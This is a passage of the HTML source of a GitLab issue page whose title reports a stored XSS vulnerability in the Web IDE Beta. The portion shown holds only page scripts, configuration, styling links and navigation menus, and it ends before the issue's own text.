





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute (#407783) · Issues · GitLab.org / GitLab · GitLab</title>
<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.com/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=100;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.analytics_url="https://collector.prd-278964.gl-product-analytics.com";gon.analytics_id="715db59f-f350-4bfd-aef8-e7a7f0c023f0";gon.sentry_dsn="https://f5573e26de8f4293b285e556c35dfd6e@new-sentry.gitlab.net/4";gon.sentry_environment="gprd";gon.sentry_clientside_traces_sample_rate=0.05;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6LfAERQTAAAAAL4GYSiAMGLbcLyUIBSfPrDNJgeC";gon.gitlab_url="https://gitlab.com";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="16eb3cf9b58";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-bd26211944b9d072037ec97cb138f1a52cd03ef185cd38b8d1fcc963245199a1.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=0;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=true;gon.jh=false;gon.dot_com=true;gon.uf_error_prefix="UF";gon.pat_prefix="glpat-";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"duoChatDynamicDimension":false,"advancedContextResolver":true,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":true,"workItemsBeta":true,"workItemsAlpha":false,"workItems":true,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"okrsMvc":false,"workItemEpics":true};gon.roadmap_epics_limit=1000;gon.subscriptions_url="https://customers.gitlab.com";gon.subscriptions_legacy_sign_in_url="https://customers.gitlab.com/customers/sign_in?legacy=true";gon.billing_accounts_url="https://customers.gitlab.com/billing_accounts";gon.payment_form_url="https://customers.gitlab.com/payment_forms/cc_validation";gon.payment_validation_form_id="payment_method_validation";gon.licensed_features={"escalationPolicies":true,"okrs":true};gon.abilities={"summarizeComments":false,"measureCommentTemperature":false};
//]]>
</script>


<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/gitlab-org/gitlab/-/issues/407783/related_branches":{},"/gitlab-org/gitlab/-/issues/407783/discussions.json?per_page=20":{},"/gitlab-org/gitlab/-/issues/407783.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"407783","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"407783"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"7SMyB94HYSPEJvsB19vLLXPNBhbKdUNnfK_2TVpj4HAveGvrnp4v0fr5UtrcdeP2d3WADxXYwlgLDKsU-TiBkQ","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.com/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-3ac16694767839eb5e86660635af7a58d98adbf48dd11dbf3d42f80beff008ee.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-f20ae9b5b8c9a0f793e3ffa2ddc13953bfd683e1d351c8e6cc75e0fcd4ddde90.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-b9f383aefa56f0a72990496e4a4b3aaf2c525843283a1c0c3d85876537187397.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-e25480d2326300d5c49ad31dbd847a53e39fc33a5fd595a961dd7238e411b558.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-7e727ab1e91b421915feadeb04a1b9d57213cb1b2f8f56f4d894b34d6b42e9b3.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-22a76cdd1fe2ae5431b7ff603f86212acaf81b49c4a932f19e3b3222dc1881ee.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" />
<link rel="stylesheet" href="/assets/tailwind-6c5813e8879a33c27249cb9a52f31d2bbf48601dc2f8913e018566151f1a9c2f.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" />

<script src="/assets/webpack/runtime.41c18450.bundle.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/main.711a3a6f.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/tracker.37d73316.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/analytics.c1bb2d5a.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
window.snowplowOptions = {"namespace":"gl","hostname":"snowplowprd.trx.gitlab.net","cookieDomain":".gitlab.com","appId":"gitlab","formTracking":true,"linkClickTracking":true}

gl = window.gl || {};
gl.snowplowStandardContext = {"schema":"iglu:com.gitlab/gitlab_standard/jsonschema/1-1-1","data":{"environment":"production","source":"gitlab-rails","correlation_id":"01JH9MGPMKQ2XYHBR2KCR0ZR0D","plan":"gold","extra":{},"user_id":null,"global_user_id":null,"is_gitlab_team_member":null,"namespace_id":9970,"project_id":278964,"feature_enabled_by_namespace_ids":null,"realm":"saas","instance_id":"ea8bf810-1d6f-4a6a-b4fd-93e8cbd8b57f","host_name":"gitlab-cny-webservice-web-76b9f579f6-hhrjn","instance_version":"17.8.0","context_generated_at":"2025-01-11T02:53:58.661Z"}}
gl.snowplowPseudonymizedPageUrl = "https://gitlab.com/namespace9970/project278964/-/issues/407783";
gl.maskedDefaultReferrerUrl = null;
gl.ga4MeasurementId = 'G-ENFH3X7M5Y';


//]]>
</script>
<link rel="preload" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" as="style" type="text/css" nonce="vfrWozb8bxIGJdrzwRddZg==">
<link rel="preload" href="/assets/application-3ac16694767839eb5e86660635af7a58d98adbf48dd11dbf3d42f80beff008ee.css" as="style" type="text/css" nonce="vfrWozb8bxIGJdrzwRddZg==">
<link rel="preload" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" as="style" type="text/css" nonce="vfrWozb8bxIGJdrzwRddZg==">
<link crossorigin="" href="https://snowplowprd.trx.gitlab.net" rel="preconnect">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-1e0a5107ea3bbd4be93e8ad2c503467e43166cd37e4293570b490e0812ede98b.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-Italic-38eaf1a569a54ab28c58b92a4a8de3afb96b6ebc250cf372003a7b38151848cc.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-08d2c5e8ff8fd3d2d6ec55bc7713380f8981c35f9d2df14e12b835464d6e8f23.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-Italic-38e58d8df29485a20c550da1d0111e2c2169f6dcbcf894f2cd3afbdd97bcc588.woff2" rel="preload">
<link rel="preload" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" as="style" type="text/css" nonce="vfrWozb8bxIGJdrzwRddZg==">



<script src="/assets/webpack/sentry.9e3f0408.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>

<script src="/assets/webpack/10.983bd1ac.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/13.4882db81.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/14.3d336eee.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-b07ae190.ec7189d6.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.ddad2718.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.62f44622.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/super_sidebar.b6b24a2c.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-68d77824.0b1a923a.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>
<script src="/assets/webpack/pages.projects.issues.show.99433ee7.chunk.js" defer="defer" nonce="GgHj/7PjWa0Ktiw7UigImA=="></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute (#407783) · Issues · GitLab.org / GitLab · GitLab" property="og:title">
<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." property="og:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.com/gitlab-org/gitlab/-/issues/407783" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute (#407783) · Issues · GitLab.org / GitLab · GitLab" property="twitter:title">
<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." property="twitter:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="GitLab SecurityBot"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Paul Slaughter and Greg Alfaro">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="WqNLKQVPPAHLc0IJhnVJ321N9f-LW8jaqf4HhUlvQkSY-BLFRdZy8_Ws69KN22EEafVz5lT2SeXeXVrc6jQjpQ" />
<meta name="csp-nonce" content="GgHj/7PjWa0Ktiw7UigImA==" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" id="favicon" data-original-href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="gitlab-org" data-group-full-path="gitlab-org" data-namespace-id="9970" data-page="projects:issues:show" data-page-type-id="407783" data-project="gitlab" data-project-full-path="gitlab-org/gitlab" data-project-id="278964">
<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/gitlab-org/gitlab/-/autocomplete_sources/epics","iterations":"/gitlab-org/gitlab/-/autocomplete_sources/iterations","vulnerabilities":"/gitlab-org/gitlab/-/autocomplete_sources/vulnerabilities","members":"/gitlab-org/gitlab/-/autocomplete_sources/members?type=Issue\u0026type_id=407783","issues":"/gitlab-org/gitlab/-/autocomplete_sources/issues","mergeRequests":"/gitlab-org/gitlab/-/autocomplete_sources/merge_requests","labels":"/gitlab-org/gitlab/-/autocomplete_sources/labels?type=Issue\u0026type_id=407783","milestones":"/gitlab-org/gitlab/-/autocomplete_sources/milestones","commands":"/gitlab-org/gitlab/-/autocomplete_sources/commands?type=Issue\u0026type_id=407783","snippets":"/gitlab-org/gitlab/-/autocomplete_sources/snippets","contacts":"/gitlab-org/gitlab/-/autocomplete_sources/contacts?type=Issue\u0026type_id=407783","wikis":null};


//]]>
</script>
<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="/"><svg aria-hidden="true" role="img" class="tanuki-logo" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path class="tanuki-shape tanuki" d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#E24329"/>
  <path class="tanuki-shape right-cheek" d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#FC6D26"/>
  <path class="tanuki-shape chin" d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z"
        fill="#FCA326"/>
  <path class="tanuki-shape left-cheek" d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z"
        fill="#FC6D26"/>
</svg>

</a><a class="gl-badge badge badge-pill badge-success canary-badge" data-testid="canary_badge_link" href="https://next.gitlab.com" rel="noopener noreferrer" target="_blank"><span class="gl-badge-content">Next
</span></a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item header-logged-out-dropdown md:gl-hidden">
<button class="header-logged-out-toggle" data-toggle="dropdown" type="button">
<span class="gl-sr-only">
Menu
</span>
<svg class="s16" data-testid="hamburger-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#hamburger"></use></svg>
</button>
<div class="dropdown-menu">
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li class="header-logged-out-nav-item gl-hidden gl-inline-block">
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm !gl-inline-flex" href="/users/sign_up"><span class="gl-button-text">
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/gitlab-org/gitlab/-/files/master?format=json&quot;,&quot;project_blob_url&quot;:&quot;/gitlab-org/gitlab/-/blob/master&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="true" data-root-path="/" data-sidebar="{&quot;whats_new_most_recent_release_items_count&quot;:6,&quot;whats_new_version_digest&quot;:&quot;c955dbe1b30a1468b032fe6896086eda50f884ff9559d966e5ef75c34eee3ff0&quot;,&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;GitLab&quot;,&quot;avatar&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;,&quot;entity_id&quot;:278964,&quot;link&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;pill_count_field&quot;:&quot;openIssuesCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/cadences&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;requirements&quot;,&quot;title&quot;:&quot;Requirements&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/requirements_management/requirements&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;pill_count_field&quot;:&quot;openMergeRequestsCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tree/master&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/commits/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/network/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/compare?from=master\u0026to=master&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;file_locks&quot;,&quot;title&quot;:&quot;Locked files&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/path_locks&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;test_cases&quot;,&quot;title&quot;:&quot;Test cases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/quality/test_cases&quot;,&quot;link_classes&quot;:&quot;shortcuts-test-cases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;packages_registry&quot;,&quot;title&quot;:&quot;Package Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/packages&quot;,&quot;link_classes&quot;:&quot;shortcuts-container-registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model 